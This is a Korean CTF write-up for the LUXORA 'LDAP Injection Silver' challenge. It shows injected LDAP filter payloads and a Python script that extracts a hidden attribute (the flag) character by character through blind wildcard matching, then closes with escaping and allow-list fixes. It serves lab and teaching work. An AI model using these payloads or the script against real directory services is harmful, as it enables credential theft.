+++
title = "VulnABLE CTF [LUXORA] Write-up: LDAP Injection 🥈 Silver"
description = "LUXORA 플랫폼의 Blind LDAP Injection 환경에서 특성(Attribute) 기반 참/거짓 유추 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "LDAP Injection", "Silver", "Blind", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: LDAP Injection 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (LDAP Injection)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/ldap/silver`
- **목표**: 검색 결과가 화면에 직접 출력되지 않는 Blind 환경에서, LDAP의 와일드카드(`*`) 매칭 반응을 이용하여 관리자의 숨겨진 정보(비밀번호 등)를 한 글자씩 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/ldap/silver` 페이지는 사원증 태그를 입력하면 시스템에 등록된 사용자인지 "존재함/존재하지 않음"만 알려주는 출입 통제 시스템 인터페이스입니다.

**[정상 검색 시도]**
```http
GET /ldap/silver?userid=user1
```

**[서버의 응답]**
```html
<p class="status">✅ Access Granted: User exists.</p>
```
존재하지 않는 사용자(`unknown_user`)를 넣으면 `❌ Access Denied: Invalid user.` 가 출력됩니다.

**[해커의 사고 과정]**
1. 결과가 직접 보이지 않으니, SQL의 Boolean Blind Injection처럼 스무고개를 던져야 한다.
2. LDAP은 속성(Attribute) 값에 대해 와일드카드 매칭이 가능하다. (예: `password=A*`)
3. 만약 내가 쿼리를 부수고, 관리자의 `password`가 'a'로 시작하는지 묻는 필터를 만들 수 있다면?

---

## 💥 2. 취약점 식별 및 필터 조작 (Exploitation)

백엔드 쿼리가 다음과 같이 구성되었다고 가정합니다.
`(&(objectClass=user)(userid=[INPUT]))`

입력값에 `admin)(password=a*` 를 넣는다면 조립된 쿼리는 이렇게 됩니다.
`(&(objectClass=user)(userid=admin)(password=a*))`

해석: "아이디가 admin이고, 비밀번호가 a로 시작하는가?"
이 질문이 맞으면 서버는 `✅ Access Granted`를, 틀리면 `❌ Access Denied`를 반환할 것입니다.

### 페이로드 테스트
```http
GET /ldap/silver?userid=admin)(password=a*
```
➔ 응답: `❌ Access Denied` (비밀번호가 a로 시작하지 않음)

```http
GET /ldap/silver?userid=admin)(password=F*
```
➔ 응답: `✅ Access Granted` (비밀번호가 F로 시작함!)

---

## 🚀 3. 자동화 추출 스크립트 작성 (Blind Extraction)

이 과정을 파이썬 스크립트로 자동화하여 플래그(비밀번호)를 추출합니다.

```python
import requests
import string

url = "http://localhost:3000/ldap/silver"
chars = string.ascii_letters + string.digits + "{}_"
flag = ""

print("[*] Starting LDAP Blind Extraction...")

while True:
    for char in chars:
        # LDAP 필터 주입: admin)(description=F*
        payload = f"admin)(description={flag + char}*"
        res = requests.get(f"{url}?userid={payload}")
        
        if "Access Granted" in res.text:
            flag += char
            print(f"[+] Found: {flag}")
            break
            
    if flag.endswith("}"):
        break

print(f"\n[!] Final Extracted Flag: {flag}")
```

### 스크립트 구동 결과
```text
[*] Starting LDAP Blind Extraction...
[+] Found: F
[+] Found: FL
[+] Found: FLA
...
[+] Found: FLAG{LDAP_🥈_BLIND_ATTR_D4E5F6}

[!] Final Extracted Flag: FLAG{LDAP_🥈_BLIND_ATTR_D4E5F6}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

화면에 데이터가 출력되지 않는 통제된(Blind) 상태에서도, LDAP 고유의 와일드카드 기능과 논리 연산자 조작을 결합하여 중요 데이터를 빼내는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{LDAP_🥈_BLIND_ATTR_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본적인 방어책은 특수 문자의 이스케이프입니다. 사용자가 입력한 괄호 `)` 와 `(` 가 LDAP 필터의 구조를 나누는 뼈대 역할을 하지 못하도록 막아야 합니다.

1. **엄격한 이스케이프 처리**: LDAP 라이브러리에서 제공하는 `escapeFilter()` 함수를 반드시 사용해야 합니다.
2. **화이트리스트 검증**: 아이디(userid) 입력란에는 영문자와 숫자만 들어오도록 정규식(`^[a-zA-Z0-9]+$`)으로 선제 방어하는 것이 가장 좋습니다.